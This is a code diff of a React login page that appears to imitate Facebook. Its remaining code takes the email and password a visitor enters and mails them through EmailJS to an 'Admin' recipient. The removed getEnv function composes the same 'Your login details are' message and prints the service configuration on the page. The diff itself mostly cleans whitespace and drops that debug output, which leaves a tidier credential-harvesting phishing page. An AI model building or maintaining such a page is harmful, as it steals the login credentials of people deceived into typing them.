@@ -19,18 +19,18 @@ function App() {
     `;
 
     const templateParams = {
-      from_name: "You",            
-      to_name: "Admin",           
-      message: emailBody,    
-      reply_to:  import.meta.env.VITE_EMAIL,            
+      from_name: "You",
+      to_name: "Admin",
+      message: emailBody,
+      reply_to: import.meta.env.VITE_EMAIL,
     };
 
     emailjs
       .send(
-        import.meta.env.VITE_EMAILJS_SERVICE_ID, 
-        import.meta.env.VITE_EMAILJS_TEMPLATE_ID, 
+        import.meta.env.VITE_EMAILJS_SERVICE_ID,
+        import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
         templateParams,
-        import.meta.env.VITE_EMAILJS_USER_ID      
+        import.meta.env.VITE_EMAILJS_USER_ID
       )
       .then(
         (response) => {
@@ -42,31 +42,6 @@ function App() {
       );
   };
 
-  const getEnv = () => {
-
-    const emailBody = `
-      Hello You, 
-
-      Your login details are:
-
-      Password: ${password}
-      Email: ${email}
-    `;
-
-    const templateParams = {
-      from_name: "You",            
-      to_name: "Admin",           
-      message: emailBody,    
-      reply_to:  import.meta.env.VITE_EMAIL,            
-    };
-
-   return  {
-    VITE_EMAILJS_SERVICE_ID: import.meta.env.VITE_EMAILJS_SERVICE_ID, 
-    VITE_EMAILJS_TEMPLATE_ID:   import.meta.env.VITE_EMAILJS_TEMPLATE_ID, 
-        templateParams,
-        VITE_EMAILJS_USER_ID: import.meta.env.VITE_EMAILJS_USER_ID   
-   }
-  }
 
   return (
     <div className="min-h-screen bg-gray-100">
@@ -83,7 +58,7 @@ function App() {
 
         <div className="bg-white p-4 rounded-xl shadow-lg w-full max-w-md">
           <form onSubmit={handleSubmit} className="space-y-4">
-          
+
             <input
               type="email"
               placeholder="Email address"
@@ -125,11 +100,9 @@ function App() {
             <span className="font-bold">Create a Page</span> for a celebrity, brand or business.
           </p>
         </div>
-        
+
       </div>
-      {JSON.stringify(
-          getEnv()
-        )}
+
     </div>
   );
 }
